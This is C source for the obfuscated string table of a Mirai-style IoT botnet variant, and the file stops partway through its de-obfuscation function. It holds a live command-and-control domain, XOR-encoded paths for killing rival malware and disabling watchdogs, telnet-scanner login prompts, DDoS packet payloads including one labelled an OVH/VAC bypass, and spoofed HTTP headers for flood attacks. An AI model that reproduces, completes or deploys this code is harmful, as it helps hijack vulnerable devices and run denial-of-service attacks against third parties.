#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdeaddaad;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{   
    add_entry(TABLE_EXEC_SUCCESS, "\x71\x6A\x77\x70\x65\x66\x68\x61\x5B\x6D\x77\x5B\x70\x6C\x61\x5B\x6C\x6D\x77\x70\x6B\x76\x7D\x5B\x6B\x62\x5B\x71\x6A\x6D\x72\x61\x76\x77\x61\x04", 36); // 
    add_entry(TABLE_CNC_DOMAIN, "bigbomboclaat.corestresser.cc", 29); // bigbomboclaat.corestresser.cc
    add_entry(TABLE_SCAN_DOMAIN, "bigbomboclaat.corestresser.cc", 29); // bigbomboclaat.corestresser.cc 
     
    add_entry(TABLE_KILLER_PROC, "\x2B\x74\x76\x6B\x67\x2B\x04", 7); // /proc/
    add_entry(TABLE_KILLER_EXE, "\x2B\x61\x7C\x61\x04", 5); // /exe
    add_entry(TABLE_KILLER_FD, "\x2B\x62\x60\x04", 4); // /fd
    add_entry(TABLE_KILLER_MAPS, "\x2B\x69\x6A\x70\x04", 6); // /maps
    add_entry(TABLE_KILLER_STATUS, "\x2B\x77\x70\x65\x70\x71\x77\x04", 8); // /status
    add_entry(TABLE_KILLER_TCP, "\x2B\x74\x76\x6B\x67\x2B\x6A\x61\x70\x2B\x70\x67\x74\x04", 14); // /proc/net/tcp
    add_entry(TABLE_KILLER_CMDLINE, "\x2B\x67\x69\x60\x68\x6D\x6A\x61\x04", 9); // /cmdline
    add_entry(TABLE_KILLER_TMP, "\x2B\x70\x69\x74\x2B\x04", 6); // tmp/
    add_entry(TABLE_KILLER_DATALOCAL, "\x2B\x60\x65\x70\x65\x2B\x68\x6B\x67\x65\x68\x2B\x70\x69\x74\x04", 16); // data/local
    add_entry(TABLE_KILLER_QTX, "\x75\x70\x7C\x66\x6B\x70\x04", 7); // qtxbot
    add_entry(TABLE_KILLER_DOT, "\x2A\x04", 2); // .
    add_entry(TABLE_KILLER_ARM, "\x65\x76\x69\x04", 4); // arm
    add_entry(TABLE_KILLER_X86, "\x7C\x3C\x32\x04", 4); // x86
    add_entry(TABLE_KILLER_SH4, "\x77\x6C\x30\x04", 4); // sh4
    add_entry(TABLE_KILLER_MIPS, "\x69\x6D\x74\x77\x04", 5); // mips
    add_entry(TABLE_KILLER_MPSL, "\x69\x74\x77\x68\x04", 5); // mpsl
    add_entry(TABLE_KILLER_SDA, "\x77\x60\x65\x04", 4); // sda
    add_entry(TABLE_KILLER_MTD, "\x69\x70\x60\x04", 4); // mtd
    add_entry(TABLE_KILLER_QTX2, "\x66\x6B\x70\x26\x59\x04", 6); // bot"]
    add_entry(TABLE_KILLER_HAKAI, "\x6C\x65\x6F\x65\x6D\x04", 6); // hakai
    add_entry(TABLE_MEM_ROUTE, "\x7B\x24\x26\x3B\x37\x7B\x3A\x31\x20\x7B\x26\x3B\x21\x20\x31\x54", 16);
    add_entry(TABLE_MEM_ASSWD, "\x35\x27\x27\x23\x3B\x26\x30\x54", 8);
    
    //Sexy Ass Memory Killer Ong.
    add_entry(TABLE_MEM_1, "\x5C\x59\x51\x28\x09", 5);
    add_entry(TABLE_MEM_2, "\x7A\x70\x7A\x7C\x79\x6D\x68\x7D\x6C\x7B\x09", 11);
    add_entry(TABLE_MEM_3, "\x42\x40\x45\x45\x48\x5D\x5D\x42\x09", 9);
    add_entry(TABLE_MEM_4, "\x4B\x46\x4E\x46\x44\x40\x59\x5A\x09", 9);
    add_entry(TABLE_MEM_5, "\x79\x68\x67\x6D\x66\x7B\x68\x09", 8);
    add_entry(TABLE_MEM_6, "\x44\x6C\x7B\x6A\x7C\x7B\x70\x09", 8);
    add_entry(TABLE_MEM_7, "\x6A\x7B\x7A\x6F\x60\x09", 6);
    add_entry(TABLE_MEM_8, "\x68\x61\x7A\x66\x62\x09", 6);
    add_entry(TABLE_MEM_9, "\x5B\x66\x66\x7D\x6C\x6D\x09", 7);
    add_entry(TABLE_MEM_10, "\x5B\x4C\x42\x48\x40\x09", 6);
    add_entry(TABLE_MEM_11, "\x64\x60\x66\x7B\x60\x09", 6);
    add_entry(TABLE_MEM_12, "\x44\x48\x5A\x5C\x5D\x48\x09", 7);
    add_entry(TABLE_MEM_13, "\x4E\x61\x66\x7A\x7D\x5E\x7C\x73\x41\x6C\x7B\x6C\x3F\x3F\x3F\x09", 16);
    add_entry(TABLE_MEM_14, "\x4A\x66\x7B\x66\x67\x68\x09", 7);
    add_entry(TABLE_MEM_15, "\x65\x66\x65\x60\x6E\x68\x67\x6E\x09", 9);
    add_entry(TABLE_MEM_16, "\x65\x66\x65\x71\x6D\x09", 6);
    add_entry(TABLE_MEM_17, "\x47\x60\x4E\x4E\x6C\x5B\x3F\x30\x71\x6D\x09", 11);
    add_entry(TABLE_MEM_18, "\x67\x7C\x6A\x65\x6C\x68\x7B\x09", 8);
    add_entry(TABLE_MEM_19, "\x6D\x7F\x7B\x41\x6C\x65\x79\x6C\x7B\x09", 10);
    add_entry(TABLE_MEM_20, "\x70\x68\x62\x7C\x73\x68\x09", 7);
    add_entry(TABLE_MEM_21, "\x5C\x67\x41\x48\x67\x68\x48\x5E\x09", 9);
    add_entry(TABLE_MEM_22, "\x48\x7B\x6C\x7A\x09", 5);
    add_entry(TABLE_MEM_23, "\x65\x6C\x7A\x7A\x60\x6C\x27\x09", 8);
    add_entry(TABLE_MEM_24, "\x41\x60\x65\x60\x71\x09", 6);
    add_entry(TABLE_MEM_25, "\x5B\x6C\x68\x79\x6C\x7B\x27\x09", 8);
    add_entry(TABLE_MEM_26, "\x48\x65\x6C\x71\x09", 5);
    add_entry(TABLE_MEM_27, "\x7A\x66\x7B\x68\x09", 5);
    add_entry(TABLE_MEM_28, "\x48\x64\x68\x62\x68\x67\x66\x09", 8);
    add_entry(TABLE_MEM_29, "\x7B\x73\x7B\x09", 4);
    add_entry(TABLE_MEM_30, "\x67\x70\x68\x09", 4);
    add_entry(TABLE_MEM_31, "\x64\x6C\x73\x70\x09", 5);
    add_entry(TABLE_MEM_32, "\x73\x61\x7B\x09", 4);
    add_entry(TABLE_MEM_33, "\x65\x73\x7B\x6D\x09", 5);
    add_entry(TABLE_MEM_34, "\x4E\x7C\x64\x64\x70\x09", 6);
    add_entry(TABLE_MEM_35, "\x44\x66\x73\x60\x09", 5);
    add_entry(TABLE_MEM_36, "\x50\x68\x62\x7C\x73\x68\x09", 7);
    add_entry(TABLE_MEM_37, "\x6D\x68\x6D\x6D\x70\x65\x3A\x3A\x7D\x09", 10);
    add_entry(TABLE_MEM_38, "\x27\x7C\x67\x3C\x09", 5);
    add_entry(TABLE_MEM_39, "\x4D\x6C\x64\x66\x67\x27\x09", 7);
    add_entry(TABLE_MEM_40, "\x46\x62\x68\x64\x60\x09", 6);

    add_entry(TABLE_SCAN_SHELL, "\x77\x6C\x61\x68\x68\x04", 6); // shell
    add_entry(TABLE_SCAN_ENABLE, "\x61\x6A\x65\x66\x68\x61\x04", 7); // enable
    add_entry(TABLE_SCAN_SYSTEM, "\x77\x7D\x77\x70\x61\x69\x04", 7); // system
    add_entry(TABLE_SCAN_SH, "\x77\x6C\x04", 3); // sh
    add_entry(TABLE_SCAN_LSHELL, "\x68\x6D\x6A\x71\x7C\x77\x6C\x61\x68\x68\x04", 11); // linuxshell
    add_entry(TABLE_SCAN_QUERY, "\x2B\x66\x6D\x6A\x2B\x66\x71\x77\x7D\x66\x6B\x7C\x24\x51\x4A\x57\x50\x45\x46\x48\x41\x04", 22); // /bin/busybox UNSTABLE
    add_entry(TABLE_SCAN_RESP, "\x51\x4A\x57\x50\x45\x46\x48\x41\x3E\x24\x65\x74\x74\x68\x61\x70\x24\x6A\x6B\x70\x24\x62\x6B\x71\x6A\x60\x04", 27); // UNSTABLE: applet not found
    add_entry(TABLE_SCAN_NCORRECT, "\x6A\x67\x6B\x76\x76\x61\x67\x70\x04", 9); // ncorrect
    add_entry(TABLE_SCAN_OGIN, "\x6B\x63\x6D\x6A\x04", 5); // ogin
    add_entry(TABLE_SCAN_ASSWORD, "\x65\x77\x77\x73\x6B\x76\x60\x04", 8); // assword
    add_entry(TABLE_SCAN_ENTER, "\x61\x6A\x70\x61\x76\x04", 6); // enter

    add_entry(TABLE_WATCHDOG_1, "\x2B\x60\x61\x72\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 14); // /dev/watchdog
    add_entry(TABLE_WATCHDOG_2, "\x2B\x60\x61\x72\x2B\x69\x6D\x77\x67\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 19); // /dev/misc/watchdog
    add_entry(TABLE_WATCHDOG_3, "\x2B\x77\x66\x6D\x6A\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 15); // /sbin/watchdog
    add_entry(TABLE_WATCHDOG_4, "\x2B\x66\x6D\x6A\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 14); // /bin/watchdog
    add_entry(TABLE_WATCHDOG_5, "\x2B\x60\x61\x72\x2B\x42\x50\x53\x40\x50\x35\x34\x35\x5B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 23); // /dev/FTWDT101_watchdog
    add_entry(TABLE_WATCHDOG_6, "\x2B\x60\x61\x72\x2B\x42\x50\x53\x40\x50\x35\x34\x35\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 23); // /dev/FTWDT101/watchdog
    add_entry(TABLE_WATCHDOG_7, "\x2B\x60\x61\x72\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x34\x04", 15); // /dev/watchdog0
    add_entry(TABLE_WATCHDOG_8, "\x2B\x61\x70\x67\x2B\x60\x61\x62\x65\x71\x68\x70\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 22); // /etc/default/watchdog
    add_entry(TABLE_WATCHDOG_9, "\x2B\x61\x70\x67\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 14); // /etc/watchdog

    add_entry(TABLE_RANDOM, "\x65\x45\x77\x35\x36\x30\x36\x67\x34\x31\x42\x63\x6E\x30\x04", 15);

    add_entry(TABLE_ATK_VSE, "\x50\x57\x6B\x71\x76\x67\x61\x24\x41\x6A\x63\x6D\x6A\x61\x24\x55\x71\x61\x76\x7D\x04", 21); // TSource Engine Query
    add_entry(TABLE_ATK_OVH, "\x0f\x02\x11\x23\x9f\xdd\x10\x09\x33\xfe\x1f\x8f\xba\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xee\x31\x41\x00\x00\x41\x0f\x02\x11\x23\x9f\xdd\x10\x09\x33\xfe\x1f\x8f\xba\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xee\x31\x41\x00\x00\x41\x0f\x02\x11\x23\x9f\xdd\x10\x09\x33\xfe\x1f\x8f\xba\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xee\x31\x41\x00\x00\x41\x00\x00\x00\x00", 100);// OVH/VAC Bypass.
    add_entry(TABLE_ATK_UDPKICK, "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01", 30);
    //add_entry(TABLE_ATK_TCP, "\x06\x81\xc0\"\xb4\x17G'P#\xd0U@MP\x02\xa6i\x04jL\xaf\xeaR\x89a\xf0\x1d\x12\bC9\xee\x17\x16\xaa\xb2\xff\xe5\xb1\xeda~\xc398\xf5\xee\xc3\xce\xf0\x96\x91ق2\x9d\xbd\x81\x1d1\x80i\xea\x807f\x99\x98\xbc\xc3\a\xc6\xfb\xbc\xac\x0f\xba\x99\xfe\x9e\xd1\xc4I\x86\x88\xed!\x94.\x9biҲ\xea\xfa]0#\x14\xe4\xdcӖV\x80\x00\x17\x00\x00\xff\x01\x00\x01\x00", 76);
    add_entry(TABLE_ATK_RESOLVER, "\x2B\x61\x70\x67\x2B\x76\x61\x77\x6B\x68\x72\x2A\x67\x6B\x6A\x62\x04", 17); // /etc/resolv.conf
    add_entry(TABLE_ATK_NSERV, "\x6A\x65\x69\x61\x77\x61\x76\x72\x61\x76\x24\x04", 12); // ---nameserver ---
    
    add_entry(TABLE_ATK_KEEP_ALIVE, "\xA9\x85\x84\x84\x8F\x89\x9E\x83\x85\x84\xD0\xCA\x81\x8F\x8F\x9A\xC7\x8B\x86\x83\x9C\x8F\xEA", 23);
    add_entry(TABLE_ATK_ACCEPT, "\xAB\x89\x89\x8F\x9A\x9E\xD0\xCA\x9E\x8F\x92\x9E\xC5\x82\x9E\x87\x86\xC6\x8B\x9A\x9A\x86\x83\x89\x8B\x9E\x83\x85\x84\xC5\x92\x82\x9E\x87\x86\xC1\x92\x87\x86\xC6\x8B\x9A\x9A\x86\x83\x89\x8B\x9E\x83\x85\x84\xC5\x92\x87\x86\xD1\x9B\xD7\xDA\xC4\xD3\xC6\x83\x87\x8B\x8D\x8F\xC5\x9D\x8F\x88\x9A\xC6\xC0\xC5\xC0\xD1\x9B\xD7\xDA\xC4\xD2\xEA", 83);
    add_entry(TABLE_ATK_ACCEPT_LNG, "\xAB\x89\x89\x8F\x9A\x9E\xC7\xA6\x8B\x84\x8D\x9F\x8B\x8D\x8F\xD0\xCA\x8F\x84\xC7\xBF\xB9\xC6\x8F\x84\xD1\x9B\xD7\xDA\xC4\xD2\xEA", 32);
    add_entry(TABLE_ATK_CONTENT_TYPE, "\xA9\x85\x84\x9E\x8F\x84\x9E\xC7\xBE\x93\x9A\x8F\xD0\xCA\x8B\x9A\x9A\x86\x83\x89\x8B\x9E\x83\x85\x84\xC5\x92\xC7\x9D\x9D\x9D\xC7\x8C\x85\x98\x87\xC7\x9F\x98\x86\x8F\x84\x89\x85\x8E\x8F\x8E\xEA", 48);
    add_entry(TABLE_ATK_SET_COOKIE, "\x99\x8F\x9E\xA9\x85\x85\x81\x83\x8F\xC2\xCD\xEA", 12);
    add_entry(TABLE_ATK_REFRESH_HDR, "\x98\x8F\x8C\x98\x8F\x99\x82\xD0\xEA", 9);
    add_entry(TABLE_ATK_LOCATION_HDR, "\x86\x85\x89\x8B\x9E\x83\x85\x84\xD0\xEA", 10);
    add_entry(TABLE_ATK_SET_COOKIE_HDR, "\x99\x8F\x9E\xC7\x89\x85\x85\x81\x83\x8F\xD0\xEA", 12);
    add_entry(TABLE_ATK_CONTENT_LENGTH_HDR, "\x89\x85\x84\x9E\x8F\x84\x9E\xC7\x86\x8F\x84\x8D\x9E\x82\xD0\xEA", 16);
    add_entry(TABLE_ATK_TRANSFER_ENCODING_HDR, "\x9E\x98\x8B\x84\x99\x8C\x8F\x98\xC7\x8F\x84\x89\x85\x8E\x83\x84\x8D\xD0\xEA", 19);
    add_entry(TABLE_ATK_CHUNKED, "\x89\x82\x9F\x84\x81\x8F\x8E\xEA", 8);
    add_entry(TABLE_ATK_KEEP_ALIVE_HDR, "\x81\x8F\x8F\x9A\xC7\x8B\x86\x83\x9C\x8F\xEA", 11);
    add_entry(TABLE_ATK_CONNECTION_HDR, "\x89\x85\x84\x84\x8F\x89\x9E\x83\x85\x84\xD0\xEA", 12);
    add_entry(TABLE_ATK_DOSARREST, "\x99\x8F\x98\x9C\x8F\x98\xD0\xCA\x8E\x85\x99\x8B\x98\x98\x8F\x99\x9E\xEA", 18);
    add_entry(TABLE_ATK_CLOUDFLARE_NGINX, "\x99\x8F\x98\x9C\x8F\x98\xD0\xCA\x89\x86\x85\x9F\x8E\x8C\x86\x8B\x98\x8F\xC7\x84\x8D\x83\x84\x92\xEA", 25);

    add_entry(TABLE_HTTP_ONE, "\xA7\x85\x90\x83\x86\x86\x8B\xC5\xDF\xC4\xDA\xCA\xC2\xA7\x8B\x89\x83\x84\x9E\x85\x99\x82\xD1\xCA\xA3\x84\x9E\x8F\x86\xCA\xA7\x8B\x89\xCA\xA5\xB9\xCA\xB2\xCA\xDB\xDA\xB5\xDB\xDB\xB5\xDC\xC3\xCA\xAB\x9A\x9A\x86\x8F\xBD\x8F\x88\xA1\x83\x9E\xC5\xDC\xDA\xDB\xC4\xDD\xC4\xDD\xCA\xC2\xA1\xA2\xBE\xA7\xA6\xC6\xCA\x86\x83\x81\x8F\xCA\xAD\x8F\x89\x81\x85\xC3\xCA\xBC\x8F\x98\x99\x83\x85\x84\xC5\xD3\xC4\xDB\xC4\xD8\xCA\xB9\x8B\x8C\x8B\x98\x83\xC5\xDC\xDA\xDB\xC4\xDD\xC4\xDD\xEA", 117);
    add_entry(TABLE_HTTP_TWO, "\xA7\x85\x90\x83\x86\x86\x8B\xC5\xDF\xC4\xDA\xCA\xC2\xBD\x83\x84\x8E\x85\x9D\x99\xCA\xA4\xBE\xCA\xDC\xC4\xDB\xD1\xCA\xBD\xA5\xBD\xDC\xDE\xC3\xCA\xAB\x9A\x9A\x86\x8F\xBD\x8F\x88\xA1\x83\x9E\xC5\xDF\xD9\xDD\xC4\xD9\xDC\xCA\xC2\xA1\xA2\xBE\xA7\xA6\xC6\xCA\x86\x83\x81\x8F\xCA\xAD\x8F\x89\x81\x85\xC3\xCA\xA9\x82\x98\x85\x87\x8F\xC5\xDE\xD2\xC4\xDA\xC4\xD8\xDF\xDC\xDE\xC4\xDB\xDA\xD3\xCA\xB9\x8B\x8C\x8B\x98\x83\xC5\xDF\xD9\xDD\xC4\xD9\xDC\xEA", 110);
    add_entry(TABLE_HTTP_THREE, "\xA7\x85\x90\x83\x86\x86\x8B\xC5\xDF\xC4\xDA\xCA\xC2\xBD\x83\x84\x8E\x85\x9D\x99\xCA\xA4\xBE\xCA\xDB\xDA\xC4\xDA\xD1\xCA\xBD\x83\x84\xDC\xDE\xD1\xCA\x92\xDC\xDE\xC3\xCA\xAB\x9A\x9A\x86\x8F\xBD\x8F\x88\xA1\x83\x9E\xC5\xDF\xD9\xDD\xC4\xD9\xDC\xCA\xC2\xA1\xA2\xBE\xA7\xA6\xC6\xCA\x86\x83\x81\x8F\xCA\xAD\x8F\x89\x81\x85\xC3\xCA\xA9\x82\x98\x85\x87\x8F\xC5\xDC\xD8\xC4\xDA\xC4\xD9\xD8\xDA\xD8\xC4\xD2\xD3\xCA\xB9\x8B\x8C\x8B\x98\x83\xC5\xDF\xD9\xDD\xC4\xD9\xDC\xEA", 115);
    add_entry(TABLE_HTTP_FOUR, "\xA7\x85\x90\x83\x86\x86\x8B\xC5\xDF\xC4\xDA\xCA\xC2\xBD\x83\x84\x8E\x85\x9D\x99\xCA\xA4\xBE\xCA\xDC\xC4\xD9\xD1\xCA\xBD\xA5\xBD\xDC\xDE\xD1\xCA\x98\x9C\xD0\xDF\xDA\xC4\xDA\xC3\xCA\xAD\x8F\x89\x81\x85\xC5\xD8\xDA\xDB\xDA\xDA\xDB\xDA\xDB\xCA\xAC\x83\x98\x8F\x8C\x85\x92\xC5\xDF\xDA\xC4\xDA\xEA", 73);
    add_entry(TABLE_HTTP_FIVE, "\xA7\x85\x90\x83\x86\x86\x8B\xC5\xDF\xC4\xDA\xCA\xC2\xBD\x83\x84\x8E\x85\x9D\x99\xCA\xA4\xBE\xCA\xDC\xC4\xD9\xD1\xCA\xBD\xA5\xBD\xDC\xDE\xC3\xCA\xAB\x9A\x9A\x86\x8F\xBD\x8F\x88\xA1\x83\x9E\xC5\xDF\xD9\xDD\xC4\xD9\xDC\xCA\xC2\xA1\xA2\xBE\xA7\xA6\xC6\xCA\x86\x83\x81\x8F\xCA\xAD\x8F\x89\x81\x85\xC3\xCA\xA9\x82\x98\x85\x87\x8F\xC5\xDF\xDB\xC4\xDA\xC4\xD8\xDD\xDA\xDE\xC4\xDB\xDA\xDC\xCA\xB9\x8B\x8C\x8B\x98\x83\xC5\xDF\xD9\xDD\xC4\xD9\xDC\xEA", 110);
    add_entry(TABLE_HTTP_6, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x30\x2A\x34\x24\x2C\x67\x6B\x69\x74\x65\x70\x6D\x66\x68\x61\x3F\x24\x49\x57\x4D\x41\x24\x3D\x2A\x34\x3F\x24\x53\x6D\x6A\x60\x6B\x73\x77\x24\x4A\x50\x24\x31\x2A\x35\x3F\x24\x50\x76\x6D\x60\x61\x6A\x70\x2B\x31\x2A\x34\x2D\x04", 64); // ---Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)---
    add_entry(TABLE_HTTP_7, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x30\x2A\x34\x24\x2C\x67\x6B\x69\x74\x65\x70\x6D\x66\x68\x61\x3F\x24\x49\x57\x4D\x41\x24\x3D\x2A\x34\x3F\x24\x53\x6D\x6A\x60\x6B\x73\x77\x24\x4A\x50\x24\x32\x2A\x34\x3F\x24\x50\x76\x6D\x60\x61\x6A\x70\x2B\x30\x2A\x34\x3F\x24\x43\x50\x46\x33\x2A\x30\x3F\x24\x4D\x6A\x62\x6B\x54\x65\x70\x6C\x2A\x37\x3F\x24\x57\x52\x35\x3F\x24\x2A\x4A\x41\x50\x24\x47\x48\x56\x24\x37\x2A\x30\x2A\x31\x37\x37\x32\x34\x3F\x24\x53\x4B\x53\x32\x30\x3F\x24\x61\x6A\x29\x51\x57\x2D\x04", 123); // ---Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)---
    add_entry(TABLE_HTTP_8, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x30\x2A\x34\x24\x2C\x67\x6B\x69\x74\x65\x70\x6D\x66\x68\x61\x3F\x24\x49\x57\x4D\x41\x24\x3D\x2A\x34\x3F\x24\x53\x6D\x6A\x60\x6B\x73\x77\x24\x4A\x50\x24\x32\x2A\x35\x3F\x24\x50\x76\x6D\x60\x61\x6A\x70\x2B\x30\x2A\x34\x3F\x24\x42\x40\x49\x3F\x24\x49\x57\x4D\x41\x47\x76\x65\x73\x68\x61\x76\x3F\x24\x49\x61\x60\x6D\x65\x24\x47\x61\x6A\x70\x61\x76\x24\x54\x47\x24\x31\x2A\x34\x2D\x04", 103); // ---Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)---
    add_entry(TABLE_HTTP_9, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x30\x2A\x34\x24\x2C\x67\x6B\x69\x74\x65\x70\x6D\x66\x68\x61\x3F\x24\x49\x57\x4D\x41\x24\x3D\x2A\x34\x3F\x24\x53\x6D\x6A\x60\x6B\x73\x77\x24\x4A\x50\x24\x32\x2A\x35\x3F\x24\x50\x76\x6D\x60\x61\x6A\x70\x2B\x30\x2A\x34\x3F\x24\x43\x50\x46\x33\x2A\x30\x3F\x24\x4D\x6A\x62\x6B\x54\x65\x70\x6C\x2A\x36\x3F\x24\x57\x52\x35\x3F\x24\x2A\x4A\x41\x50\x24\x47\x48\x56\x24\x30\x2A\x30\x2A\x31\x3C\x33\x3D\x3D\x3F\x24\x53\x4B\x53\x32\x30\x3F\x24\x61\x6A\x29\x51\x57\x2D\x04", 123); // ---Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)---
    add_entry(TABLE_HTTP_10, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x30\x2A\x34\x24\x2C\x67\x6B\x69\x74\x65\x70\x6D\x66\x68\x61\x3F\x24\x49\x57\x4D\x41\x24\x3D\x2A\x34\x3F\x24\x53\x6D\x6A\x60\x6B\x73\x77\x24\x4A\x50\x24\x32\x2A\x35\x3F\x24\x50\x76\x6D\x60\x61\x6A\x70\x2B\x31\x2A\x34\x3F\x24\x42\x71\x6A\x53\x61\x66\x54\x76\x6B\x60\x71\x67\x70\x77\x2D\x04", 80); // ---Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)---
    add_entry(TABLE_HTTP_11, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x31\x2A\x34\x24\x2C\x49\x65\x67\x6D\x6A\x70\x6B\x77\x6C\x3F\x24\x4D\x6A\x70\x61\x68\x24\x49\x65\x67\x24\x4B\x57\x24\x5C\x24\x35\x34\x2A\x32\x3F\x24\x76\x72\x3E\x36\x31\x2A\x34\x2D\x24\x43\x61\x67\x6F\x6B\x2B\x36\x34\x35\x34\x34\x35\x34\x35\x24\x42\x6D\x76\x61\x62\x6B\x7C\x2B\x36\x31\x2A\x34\x04", 82); // ---Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0---
    add_entry(TABLE_HTTP_12, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x31\x2A\x34\x24\x2C\x49\x65\x67\x6D\x6A\x70\x6B\x77\x6C\x3F\x24\x4D\x6A\x70\x61\x68\x24\x49\x65\x67\x24\x4B\x57\x24\x5C\x24\x35\x34\x2A\x3C\x3F\x24\x76\x72\x3E\x36\x35\x2A\x34\x2D\x24\x43\x61\x67\x6F\x6B\x2B\x36\x34\x35\x34\x34\x35\x34\x35\x24\x42\x6D\x76\x61\x62\x6B\x7C\x2B\x36\x35\x2A\x34\x04", 82); // ---Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0---
    add_entry(TABLE_HTTP_13, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x31\x2A\x34\x24\x2C\x49\x65\x67\x6D\x6A\x70\x6B\x77\x6C\x3F\x24\x4D\x6A\x70\x61\x68\x24\x49\x65\x67\x24\x4B\x57\x24\x5C\x24\x35\x34\x2A\x3C\x3F\x24\x76\x72\x3E\x36\x30\x2A\x34\x2D\x24\x43\x61\x67\x6F\x6B\x2B\x36\x34\x35\x34\x34\x35\x34\x35\x24\x42\x6D\x76\x61\x62\x6B\x7C\x2B\x36\x30\x2A\x34\x04", 82); // ---Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0---
    add_entry(TABLE_HTTP_14, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x31\x2A\x34\x24\x2C\x49\x65\x67\x6D\x6A\x70\x6B\x77\x6C\x3F\x24\x4D\x6A\x70\x61\x68\x24\x49\x65\x67\x24\x4B\x57\x24\x5C\x24\x35\x34\x5B\x35\x34\x3F\x24\x76\x72\x3E\x37\x37\x2A\x34\x2D\x24\x43\x61\x67\x6F\x6B\x2B\x36\x34\x35\x34\x34\x35\x34\x35\x24\x42\x6D\x76\x61\x62\x6B\x7C\x2B\x37\x37\x2A\x34\x04", 83); // ---Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0---
    add_entry(TABLE_HTTP_15, "\x49\x6B\x7E\x6D\x68\x68\x65\x2B\x31\x2A\x34\x24\x2C\x53\x6D\x6A\x60\x6B\x73\x77\x24\x4A\x50\x24\x35\x34\x2A\x34\x3F\x24\x53\x6D\x6A\x32\x30\x3F\x24\x7C\x32\x30\x2D\x24\x45\x74\x74\x68\x61\x53\x61\x66\x4F\x6D\x70\x2B\x31\x37\x33\x2A\x37\x32\x24\x2C\x4F\x4C\x50\x49\x48\x28\x24\x68\x6D\x6F\x61\x24\x43\x61\x67\x6F\x6B\x2D\x24\x47\x6C\x76\x6B\x69\x61\x2B\x32\x36\x2A\x34\x2A\x37\x36\x34\x36\x2A\x3D\x30\x04", 101); // ---Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94---

    add_entry(TABLE_ATK_HTTP, "\xA2\xBE\xBE\xBA\xC5\xDB\xC4\xDB\xEA", 9);
    add_entry(TABLE_ATK_USERAGENT, "\xBF\x99\x8F\x98\xC7\xAB\x8D\x8F\x84\x9E\xD0\xEA", 12);
    add_entry(TABLE_ATK_HOST, "\xA2\x85\x99\x9E\xD0\xEA", 6);
    add_entry(TABLE_ATK_COOKIE, "\xA9\x85\x85\x81\x83\x8F\xD0\xEA", 8);
    
    // Scan callback port (3912 = 0x0F48)
    add_entry(TABLE_SCAN_CB_PORT, "\x0F\x48", 2);
    add_entry(TABLE_ATK_SEARCHHTTP, "\x82\x9E\x9E\x9A\xEA", 5);
    add_entry(TABLE_ATK_URL, "\x9F\x98\x86\xD7\xEA", 5);
    add_entry(TABLE_ATK_POST, "\xBA\xA5\xB9\xBE\xEA", 5);

}


void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[hiroshima/table] tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[hiroshima/table] tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[hiroshima/table] tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
